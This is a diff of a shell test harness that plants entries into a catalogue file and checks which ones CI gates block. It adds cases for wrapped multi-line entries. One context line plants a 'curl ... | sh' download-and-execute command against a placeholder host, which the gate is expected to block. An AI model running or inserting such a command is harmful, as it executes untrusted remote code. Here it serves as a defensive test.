@@ -38,6 +38,8 @@ plant curlsh     "printf '#!/bin/sh\ncurl -fsSL https://example.invalid/i.sh | s
 plant qualified  "printf '\\n%s\\n' 'R97. **Qualified labels** · **Pattern (1.21.2+):** old · **Error (downport):** \`x\` in 1.21.1 · **Fix (→1.21.1):** new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
 plant combined   "printf '\\n%s\\n' 'R96. **Combined label** · **Pattern → Error → Fix:** old → \`x\` at 1.21.1 → new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
 plant startitle  "printf '\\n%s\\n' 'R95. **Star in title: \`enchantable/*\`** · **Pattern:** old · **Symptom:** none, at 1.21.1 · **Fix:** new.' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
+plant wrapped    "printf '\\nR94. **A wrapped lesson whose labels sit on the next\\nline** · **Pattern:** old · **Runtime:** IllegalStateException at 1.21.1 · **Fix:** new.\\n' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
+plant wrapnofix  "printf '\\nR93. **A wrapped lesson with no fix,\\nstill** · **Pattern:** old · **Runtime:** IllegalStateException at 1.21.1.\\n' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
 plant nosymptom  "printf '\nR98. **Vague lesson** · **Pattern:** old · **Fix:** new, in 1.21.\n' >> CATALOG.md && python3 tools/check-catalog-fidelity.py --update >/dev/null"
 plant droprule   "python3 - <<'PY'
 import re
@@ -69,6 +71,8 @@ expect startitle 0 ""                           "CONTROL: a title containing * d
 expect leak      1 "gate:ip"                    "a lesson naming a forbidden mod is BLOCKED by the IP gate"
 expect jar       1 "binary"                     "an added binary is BLOCKED"
 expect curlsh    1 "pipes a download into a shell" "curl | sh is BLOCKED"
+expect wrapped   0 ""                           "CONTROL: an entry wrapped over lines is read whole -- labels after line 1 count"
+expect wrapnofix 1 "lacks \\*\\*Fix"             "a WRAPPED entry with no **Fix:** is still BLOCKED"
 expect nosymptom 1 "lacks a symptom"            "a new entry with no symptom is BLOCKED"
 expect droprule  1 "gate:fidelity"              "a deleted catalogue rule is BLOCKED by the fidelity gate"
 expect dropboth  1 "gate:fidelity"              "a rule deleted TOGETHER with its census row is still BLOCKED (base census)"
